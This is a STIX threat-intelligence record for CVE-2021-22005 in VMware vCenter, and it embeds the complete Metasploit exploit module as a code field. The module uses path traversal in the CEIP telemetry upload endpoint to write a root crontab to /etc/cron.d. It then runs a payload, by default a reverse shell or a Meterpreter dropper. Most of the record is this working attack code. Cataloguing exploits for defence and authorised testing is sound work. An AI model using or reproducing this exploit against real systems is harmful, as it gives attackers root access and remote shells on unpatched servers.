{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--101d0c80-ddd5-495a-adbb-9fb18c918d1d",
    "created": "2024-08-14T17:03:18.653306Z",
    "modified": "2024-08-14T17:03:18.65331Z",
    "name": "VMware vCenter Server Analytics (CEIP) Service File Upload",
    "description": " This module exploits a file upload in VMware vCenter Server's analytics/telemetry (CEIP) service to write a system crontab and execute shell commands as the root user.  Note that CEIP must be enabled for the target to be exploitable by this module. CEIP is enabled by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/vmware_vcenter_analytics_file_upload.rb",
            "external_id": "vmware_vcenter_analytics_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22005"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2021-0020.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/15E0q0tdEZ/cve-2021-22005/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/"
        },
        {
            "source_name": "reference",
            "url": "https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware vCenter Server Analytics (CEIP) Service File Upload',\n        'Description' => %q{\n          This module exploits a file upload in VMware vCenter Server's\n          analytics/telemetry (CEIP) service to write a system crontab and\n          execute shell commands as the root user.\n\n          Note that CEIP must be enabled for the target to be exploitable by\n          this module. CEIP is enabled by default.\n        },\n        'Author' => [\n          'George Noseevich', # Discovery\n          'Sergey Gerasimov', # Discovery\n          'VMware', # Initial PoC\n          'Derek Abdine', # Analysis\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2021-22005'],\n          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0020.html'],\n          ['URL', 'https://attackerkb.com/topics/15E0q0tdEZ/cve-2021-22005/rapid7-analysis'],\n          ['URL', 'https://censys.io/blog/vmware-cve-2021-22005-technical-impact-analysis/'],\n          ['URL', 'https://testbnull.medium.com/quick-note-of-vcenter-rce-cve-2021-22005-4337d5a817ee']\n        ],\n        'DisclosureDate' => '2021-09-21',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_perl_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'WfsDelay' => 60\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/analytics/telemetry/ph/api/level'),\n      'vars_get' => {\n        '_c' => ''\n      }\n    )\n\n    return CheckCode::Unknown unless res\n\n    unless res.code == 200 && res.body == '\"FULL\"'\n      return CheckCode::Safe('CEIP is not fully enabled.')\n    end\n\n    CheckCode::Appears('CEIP is fully enabled.')\n  end\n\n  def exploit\n    print_status('Creating path traversal')\n\n    # /var/log/vmware/analytics/prod/_c_i/\n    unless write_file(rand_text_alphanumeric(8..16))\n      fail_with(Failure::NotVulnerable, 'Failed to create path traversal')\n    end\n\n    print_good('Successfully created path traversal')\n\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n\n    print_warning(\"Please wait up to #{wfs_delay} seconds for a session\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    print_status(\"Writing system crontab: #{crontab_path}\")\n\n    crontab_file = crontab(cmd)\n    vprint_line(crontab_file)\n\n    # /var/log/vmware/analytics/prod/_c_i/../../../../../../etc/cron.d/\n    unless write_file(\"../../../../../../etc/cron.d/#{crontab_name}\", crontab_file)\n      fail_with(Failure::PayloadFailed, 'Failed to write system crontab')\n    end\n\n    print_good('Successfully wrote system crontab')\n  end\n\n  def write_file(path, data = nil)\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/analytics/telemetry/ph/api/hyper/send'),\n      'ctype' => 'application/json',\n      'vars_get' => {\n        '_c' => '',\n        '_i' => \"/#{path}\"\n      },\n      'data' => data\n    )\n\n    return false unless res&.code == 201\n\n    true\n  end\n\n  def crontab(cmd)\n    # https://man7.org/linux/man-pages/man5/crontab.5.html\n    <<~CRONTAB.strip\n      * * * * * root rm -rf #{crontab_path} /var/log/vmware/analytics/prod/_c_i/\n      * * * * * root #{cmd}\n    CRONTAB\n  end\n\n  def crontab_path\n    \"/etc/cron.d/#{crontab_name}.json\"\n  end\n\n  def crontab_name\n    @crontab_name ||= rand_text_alphanumeric(8..16)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-09-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}